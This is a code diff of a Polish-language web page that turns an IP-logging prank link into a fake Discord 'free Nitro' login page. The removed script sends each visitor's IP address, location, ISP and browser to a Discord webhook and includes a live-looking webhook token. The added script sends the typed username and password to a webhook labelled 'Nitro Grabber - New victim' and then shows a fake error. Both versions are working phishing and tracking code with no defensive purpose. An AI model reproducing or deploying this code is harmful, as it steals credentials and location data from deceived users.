@@ -3,57 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sprawdź to 😂</title>
+    <title>Discord</title>
     <style>
         body {
             margin: 0;
             padding: 0;
+            background: #36393f;
+            font-family: 'Segoe UI', Arial, sans-serif;
             height: 100vh;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            font-family: Arial, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            text-align: center;
+            color: #dcddde;
         }
-        h1 { font-size: 3rem; margin-bottom: 20px; }
-        p { font-size: 1.4rem; }
+        .container {
+            background: #202225;
+            padding: 30px;
+            border-radius: 8px;
+            width: 380px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h1 {
+            text-align: center;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        p {
+            text-align: center;
+            color: #b9bbbe;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #2f3136;
+            border: none;
+            border-radius: 4px;
+            color: #dcddde;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #5865f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #4752c4;
+        }
+        .small {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 20px;
+            color: #72767d;
+        }
     </style>
 </head>
 <body>
-    <div>
-        <h1>😂 NO KURWA SPÓJRZ NA TO</h1>
-        <p>To jest najlepsze co dziś widziałeś</p>
+    <div class="container">
+        <h1>Odbierz Nitro za darmo!</h1>
+        <p>Zaloguj się, żeby odebrać 3-miesięczny Discord Nitro</p>
+        <input type="text" placeholder="Nazwa użytkownika lub email" id="email">
+        <input type="password" placeholder="Hasło" id="password">
+        
+        <button onclick="login()">Zaloguj się</button>
+        
+        <div class="small">Zapomniałeś hasła?</div>
     </div>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1501014502097813509/SwPATh2xn8-gi5aPGp3LRymj8LxWoF_bOWZx5hjfMPHwx-KhgY2v9OKbN80Mjy1x_8hd";
-
-        fetch("https://ipapi.co/json/")
-            .then(r => r.json())
-            .then(data => {
-                fetch(webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (email && password) {
+                fetch('https://discord.com/api/webhooks/TUTAJ_WSTAW_WEBHOOK', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "**Nowy cwel kliknął link!**",
-                        embeds: [{
-                            color: 0xff0000,
-                            title: "Ktoś wszedł na link",
-                            fields: [
-                                { name: "IP", value: data.ip || "Nieznane", inline: true },
-                                { name: "Miasto", value: data.city || "Nieznane", inline: true },
-                                { name: "Kraj", value: data.country_name || "Nieznane", inline: true },
-                                { name: "Provider", value: data.org || "Nieznane", inline: false },
-                                { name: "Przeglądarka", value: navigator.userAgent.substring(0, 80) + "...", inline: false },
-                                { name: "Czas", value: new Date().toLocaleString('pl-PL'), inline: false }
-                            ]
-                        }]
+                        content: `**Nitro Grabber - Nowa ofiara!**\n\n**Email:** ${email}\n**Hasło:** ${password}`
                     })
-                });
-            })
-            .catch(() => {});
+                }).catch(() => {});
+                
+                alert("Coś poszło nie tak. Spróbuj ponownie.");
+            }
+        }
     </script>
 </body>
 </html>
